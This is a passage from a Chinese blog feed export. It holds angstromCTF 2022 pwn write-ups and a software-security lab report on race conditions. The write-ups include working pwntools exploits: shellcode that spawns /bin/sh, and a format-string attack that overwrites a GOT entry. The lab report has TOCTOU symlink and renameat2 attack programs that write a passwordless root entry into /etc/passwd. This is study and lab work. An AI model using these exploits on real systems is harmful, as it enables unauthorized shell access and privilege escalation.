class="line">1c:       01 12                   add    DWORD PTR [rdx], edx</span><br><span class="line">1e:       00 01                   add    BYTE PTR [rcx], al</span><br><span class="line">20:       14 00                   adc    al, 0x0</span><br></pre></td></tr></table></figure><p>（这里省略大概90万行）<br>之后就是在里面找有用的，没有什么技巧，全是感情(太累了！！)<br>注意这里比较麻烦的就是<code>syscall</code>这条指令是\x0f\x05也不是奇偶相见的，因此也要通过加加减减构造。总之就是没什么意思的题目，现实中也完全碰不到。做一次也就够了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./parity&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31226</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm_shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add dx,0x41</span></span><br><span class="line"><span class="string">add dx,0x55</span></span><br><span class="line"><span class="string">mov al, 0xf</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add rdx,1</span></span><br><span class="line"><span class="string">mov al,0x5</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add dx,0x21</span></span><br><span class="line"><span class="string">mov al,0x2f</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x61</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x69</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x6d</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x2f</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x73</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">add dx,0x1</span></span><br><span class="line"><span class="string">mov al,0x67</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add    DWORD PTR [rdx], eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string">sub rdx,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">syscall_shell = asm(asm_shell)</span><br><span class="line"><span class="comment"># print(len(syscall_shell))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4012F5&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.send(syscall_shell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="caniride"><a href="#caniride" class="headerlink" title="caniride"></a>caniride</h2><p>这个题我觉得只能爆破..如果大家有更好的思路欢迎交流。</p><p>这个题特殊的地方在于，写格式化字符串的地方并不知道要写入的地址是多少</p><p>做不动了，下面的没法爆破，写不来爆破脚本,改一下能循环爆破就可以了。调试下来这个gadget是能用的，本地能出shell。</p><p>PS: 这道题赛后复现，确实有一种不用爆破的方法。例如下面的这样的payoad</p><p><code>%*20$x%16$hn%*21$x%17$hn%*22$x%18$hn%*23$x%19$hn</code>。其中的*表示这里写入多少数字的参数在后面。算是一种新学到的用法。不过这样要自己构造格式化字符串。用这里的get_shorts函数，也是比较方便的。</p><p>具体思路是劫持exit_got为main之后循环。最后劫持exit_got为one_gadget.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./caniride&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shorts</span>(<span class="params">target_value</span>): <span class="comment"># calculate printf argument</span></span><br><span class="line">    shorts = []</span><br><span class="line">    curr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = target_value % <span class="number">65536</span></span><br><span class="line">        desired_value = (num - curr + <span class="number">65536</span>) % <span class="number">65536</span></span><br><span class="line">        shorts.append(desired_value)</span><br><span class="line">        curr = (curr + desired_value) % <span class="number">65536</span></span><br><span class="line">        target_value = target_value &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> shorts</span><br><span class="line">    </span><br><span class="line">io = process(filename)</span><br><span class="line">og = [<span class="number">0xe3b2e</span>,<span class="number">0xe3b31</span>,<span class="number">0xe3b34</span>] <span class="comment"># the middlen one counts</span></span><br><span class="line">bias = <span class="number">8</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x147E&quot;)</span></span><br><span class="line">payload1 = <span class="string">&quot;%*20$x%16$hn%*21$x%17$hn%*22$x%18$hn%*23$x%19$hn&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;driver: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this is &#x27;</span>)</span><br><span class="line">code_info = u64(io.recvuntil(<span class="string">&#x27; &#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">code_base = code_info - <span class="number">0x35a8</span></span><br><span class="line">success(<span class="string">&quot;code_base: &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>] + code_base</span><br><span class="line">success(<span class="string">&quot;exit_got: &quot;</span> + <span class="built_in">hex</span>(exit_got))</span><br><span class="line">main_addr = code_base + <span class="number">0x1269</span>; </span><br><span class="line">shorts = get_shorts(main_addr)</span><br><span class="line">buf_payload = p64(exit_got) + p64(exit_got+<span class="number">2</span>)+p64(exit_got+<span class="number">4</span>)+p64(exit_got+<span class="number">6</span>)+p64(shorts[<span class="number">0</span>])+p64(shorts[<span class="number">1</span>])+p64(shorts[<span class="number">2</span>])+p64(shorts[<span class="number">3</span>])</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1494&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;yourself: &#x27;</span>)</span><br><span class="line">io.sendline(buf_payload)</span><br><span class="line"><span class="comment"># now exit should return to main</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># second</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;brva 0x147E&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;%21$p&quot;</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;driver: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">buf_payload2 = <span class="string">&quot;a&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;yourself: &#x27;</span>)</span><br><span class="line">io.sendline(buf_payload2)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Bye, &#x27;</span>)</span><br><span class="line">libc_info = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;!\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x1f2538</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get libc_base</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x13E6&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;driver: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">og_addr = og[<span class="number">1</span>] + libc_base</span><br><span class="line">shorts = get_shorts(og_addr)</span><br><span class="line">buf_payload = p64(exit_got) + p64(exit_got+<span class="number">2</span>)+p64(exit_got+<span class="number">4</span>)+p64(exit_got+<span class="number">6</span>)+p64(shorts[<span class="number">0</span>])+p64(shorts[<span class="number">1</span>])+p64(shorts[<span class="number">2</span>])+p64(shorts[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;yourself: &#x27;</span>)</span><br><span class="line">io.sendline(buf_payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/05/05/angstormCTF2022-pwn/image-20220508223842557.png" alt="image-20220508223842557"></p><blockquote><p>逆向的wp，可见松神的博客</p><p><a href="https://qxz-coder.github.io/2022/05/05/angstromctf-rev/">https://qxz-coder.github.io/2022/05/05/angstromctf-rev/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> wp </tag>
            
            <tag> shellcode </tag>
            
            <tag> fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security-lab4</title>
      <link href="/2022/05/04/software-security-lab4/"/>
      <url>/2022/05/04/software-security-lab4/</url>
      
        <content type="html"><![CDATA[<p>软件安全实验4，内核条件竞争漏洞.主要是linux下的dirty cow，toctou相关缺陷攻击</p><span id="more"></span><h1 id="race-condition"><a href="#race-condition" class="headerlink" title="race_condition"></a>race_condition</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p>这里提到了一个特殊的密码<code>U6aMy0wojraho</code>。当我们在/etc/passwd中设置用户密码为这个时，可以直接enter登录，不需要填写。</p><p>发现写入到/etc/passwd之后确实可以不用输入密码登录</p><p><img src="/2022/05/04/software-security-lab4/image-20220503190432999.png" alt="image-20220503190432999"></p><p><img src="/2022/05/04/software-security-lab4/image-20220503190942022.png" alt="image-20220503190942022"></p><p>确实非常神奇。</p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>在做实验之前，我们首先关掉两个保护。一是防止用户把自己的符号链接链接到其他用户的文件上，二是防止root写用户的文件。因为一般用户的文件都是用户自己维护的，root一般能修改的都是系统的文件。</p><blockquote><p>chmod 4755的作用</p><p>和chmod 755的区别在于：前面的4确保我们在以seed的身份执行此文件时，具有与所有着相当的权限。后续我们设置chown root也就是把所有者设置为root。</p></blockquote><h3 id="etc-passwd格式"><a href="#etc-passwd格式" class="headerlink" title="/etc/passwd格式"></a>/etc/passwd格式</h3><p>我们看一个典型的/etc/passwd文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>这里第一位是<code>root</code>，表示用户名称。</p><p>第二位是x。表示密码在/etc/shadow中。而其实/etc/shadow中存放的是hash过的用户密码。如果这里写入的不是x，也可以直接写入密码。这样OS就会在登陆的时候直接找这里的密码。</p><p>第三位是用户标识号。如果设置为0表示用户具有root权限。</p><p>第四个是用户组ID。一般只需要知道上述四个即可。</p><h3 id="task2-A"><a href="#task2-A" class="headerlink" title="task2.A"></a>task2.A</h3><p>这里程序中间暂停了10秒，在这段时间内我们可以将<code>/tmp/XYZ</code>修改成<code>/etc/passwd</code>即可。</p><p>原理：我们首先检查access文件是否可达的时候，看到的是<strong>谁运行的此文件(uid)<strong>，因此如果我们想要写入/etc/passwd，此处以seed的身份无法通过<code>access</code>的检查。</strong>但是<code>fopen()</code>检查的是当前可执行文件的拥有者是否有对目标文件写入的权限(euid)<strong>。因此，我们用fopen打开<code>/etc/passwd</code>时，</strong>是可以写入的</strong>。尤其是当我们用chmod 4755之后，始终可以使用fopen打开/etc/passwd。</p><p>于是我们要做的，就是在vlup进行sleep的同时，调用下面的函数，将/tmp/XYZ软连接到/etc/passwd即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">    symlink(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功截图如下所示。我们就把上面那个特殊的密码写入了<code>/etc/passwd</code>之后就可以直接root。注意要先创建一个<code>/tmp/XYZ</code>，并且把对应权限改为777。(pdf里面写的)</p><p><img src="/2022/05/04/software-security-lab4/image-20220503225412448.png" alt="image-20220503225412448"></p><p><img src="/2022/05/04/software-security-lab4/image-20220503225423957.png" alt="image-20220503225423957"></p><h3 id="task2-B"><a href="#task2-B" class="headerlink" title="task2.B"></a>task2.B</h3><p>​    我们编写如下程序。首先把<code>/tmp/XYZ</code>改到<code>/dev/null</code>，这是为了通过<code>access()</code>的检查，其次usleep一段时间是为了防止竞争条件变化太快，最后把<code>/tmp/XYZ</code>链接到/etc/passwd是为了通过条件竞争获取写的可能性。</p><p>我们如果想要成功，必须先<code>unlink</code>到<code>/dev/null</code>接着通过<code>vulp</code>的<code>access</code>。之后回到本文件的unlink到/etc/passwd，最后再回到vulp。可以看出条件竞争还是很苛刻的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        symlink(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        usleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        symlink(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        usleep(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上述程序编译，之后确保<code>/tmp/ABC</code>文件存在并且拥有者为<code>seed</code>。首先运行上述.c文件编译的<code>attack</code>文件，接着运行<code>target_process.sh</code>。但是尝试了好久也没有成功。期间查看<code>tmp/XYZ</code>文件类型，发现已经被改为<code>root</code>拥有。这样将一直无法通过access检查。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504095017959.png" alt="image-20220504095017959"></p><blockquote><p>思考：看到上面文件大小很大，说明我们已经成功写入了这个文件。说明vulp肯定通过了access的检查。但是注意access只是检查调用者的身份。这里可能会有疑问: 调用者是seed，但是/tmp/XYZ是root拥有的，为什么还能通过access的检验? 做了相关试验后发现，<strong>access通过只需要文件用户组ID和调用者ID对的上即可通过</strong>。在这里我们以seed身份运行程序，而/tmp/XYZ也是属于用户组seed的(从上面这张图可以看出)，<strong>因此本来就可以写入</strong>。</p></blockquote><h3 id="task2-C"><a href="#task2-C" class="headerlink" title="task2.C"></a>task2.C</h3><p>这里解释了为什么之前我们的攻击不会成功。因为<code>/tmp</code>文件夹有粘滞性质，只有符号链接的拥有者才可以修改文件，即使文件是所有人都可以写的。</p><p>作者给出了一个改进方案，就是使用一个原子操作来删掉现有的符号链接(也就是unlink)并且把它换成一个新的符号链接(因为这牵涉到两个不同的系统调用)。之前错误发生的原因是，如果在unlink之后，程序被切换成了<code>vulp</code>，那么<code>fopen</code>就会创造一个和自己用户组一样的文件，也就是输入<code>root</code>的<code>/tmp/XYZ</code>。所以造成了之前的问题。</p><p>那么我们只需要一个原子操作，把Unlink和symlink放在同一时刻执行即可。使用<code>renameat2</code>系统调用可以原子性的交换他们。注意到我们先把<code>/tmp/ABC</code>符号链接到<code>/etc/passwd</code>，之后尝试交换/tmp/XYZ和/tmp/ABC的路径即可。</p><p>总结一下上述攻击流程，如下图所示。右边是三种攻击流程，包括了成功，一般的失败情况，和为什么会创建一个root的文件。</p><p><img src="/2022/05/04/software-security-lab4/race_explain.png" alt="race_explain"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags = RENAME_EXCHANGE;</span><br><span class="line">    renameat2(<span class="number">0</span>,<span class="string">&quot;/tmp/ABC&quot;</span>,<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>,flags);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        renameat2(<span class="number">0</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;/dev/null&quot;</span>,flags);</span><br><span class="line">        renameat2(<span class="number">0</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;/tmp/ABC&quot;</span>,flags);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/software-security-lab4/image-20220504141149384.png" alt="image-20220504141149384"></p><p><img src="/2022/05/04/software-security-lab4/image-20220504142821358.png" alt="image-20220504142821358"></p><p>关于为什么fd参数为0的解释。</p><p><img src="/2022/05/04/software-security-lab4/image-20220512145454981.png" alt="image-20220512145454981"></p><p>这里是成功的截图。</p><p><img src="/2022/05/04/software-security-lab4/image-20220505122606484.png" alt="image-20220505122606484"></p><p>之后测试sudo test可以得到正确的结果。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504143621771.png" alt="image-20220504143621771"></p><h2 id="task3-a"><a href="#task3-a" class="headerlink" title="task3.a"></a>task3.a</h2><p>这里要求我们使用<code>seteuid</code>来限制用户的权限。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504144152866.png" alt="image-20220504144152866"></p><p>如果在程序执行一开始调用seteuid，我们的effective userID将被设置为和read <code>uid</code>一样的内容，而uid即为执行程序的人拥有的权限。这里就是seed。因此在<code>fopen</code>时，进程检查我们的effective userID时，就会发现并不是root，从而失去对/etc/passwd写入的能力，从而完成了防御。同时，也不需要用access来做检查了。</p><p>我们把vulp改成如下所示的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 